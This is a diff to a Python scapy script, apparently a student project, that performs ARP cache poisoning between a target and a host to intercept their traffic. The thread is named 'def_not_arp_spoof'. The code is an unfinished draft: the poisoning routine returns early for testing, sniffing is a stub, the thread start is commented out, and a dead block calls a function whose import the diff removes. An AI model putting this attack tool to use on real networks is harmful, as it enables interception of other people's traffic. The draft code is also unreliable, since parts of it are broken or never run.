@@ -1,3 +1,4 @@
+# /usr/bin/python3 
 '''
 ARPSpoof Program by Clayton Johnson and Mitchell Bohn
 
@@ -6,21 +7,30 @@ Steps:
 
 '''
 import argparse
-from scapy.all import Ether, ARP, srp, send
+from scapy.all import Ether, ARP, sr, send
 from time import sleep
 import threading
+import sys
 
 def get_mac_address(ip):
 	#Make ARP Request to get MAC addy for given ip
-	print(f'Making ARP Request for {ip}')
+	#print(f'Making ARP Request for {ip}')
+	'''print('Making ARP Request for {}'.format(ip))
 	
-	arp_pkt = Ether('ff:ff:ff:ff:ff:ff')/ARP(pdst=ip)
-	response, we = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=10, verbose=0)
+	#arp_pkt = Ether('ff:ff:ff:ff:ff:ff')/ARP(pdst=ip)
+	response, extra = srp(Ether('ff:ff:ff:ff:ff:ff')/ARP(pdst=ip, op='is-at'), timeout=5, verbose=0)
 	mac = None
 	if response:
 		#print(response[0][1].src)
 		mac = response[0][1].src
-	print(f'{ip} => {mac}')
+	#print(f'{ip} => {mac}')
+	print('{} => {}'.format(ip, mac))
+	'''
+	resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip), retry=2, timeout=10)
+	for s,r in resp:
+		print(resp[0][1][ARP].hwsrc)
+		return resp[0][1][ARP].hwsrc
+
 
 def clean_ip(addr):
 	#Makes sure that the ip address is valid
@@ -55,7 +65,7 @@ def poison(mac_1=None, ip_1=None, mac_2=None, ip_2=None):
 			send(pkt21)
 		
 			#Wait a couple seconds
-			sleep(30)
+			sleep(3)
 
 			return 'we need to stop for testing purposes and add some error conditions'
 			
@@ -64,8 +74,10 @@ def start_sniffing_stuff(t_ip, t_mac, h_ip, h_mac):
 	print('Sniffing initiated...')
 
 def spoof_time(t_ip, h_ip):
-	print(f'Target IP: {t_ip}')
-	print(f'Host IP: {h_ip}')
+	#print(f'Target IP: {t_ip}')
+	print('Target IP: {}'.format(t_ip))
+	#print(f'Host IP: {h_ip}')
+	print('Host IP: {}'.format(h_ip))
 	
 	#Get MAC Addys for both target and host ips
 	t_mac = get_mac_address(t_ip)
@@ -76,12 +88,12 @@ def spoof_time(t_ip, h_ip):
 	
 	#Kick off thread to poison the cache
 	poison_thread = threading.Thread(target=poison, args=(clean_mac(t_mac), t_ip, clean_mac(h_mac), h_ip), name='def_not_arp_spoof')
-	poison_thread.run()
+	#poison_thread.run()
 
 	#Receive traffic and output
 	start_sniffing_stuff(t_ip, t_mac, h_ip, h_mac)
 
-	sleep(60)
+	sleep(3)
 
 if __name__ == '__main__':
 	#Usage : $ arpspoof.py -t <targetIP> -r <host>
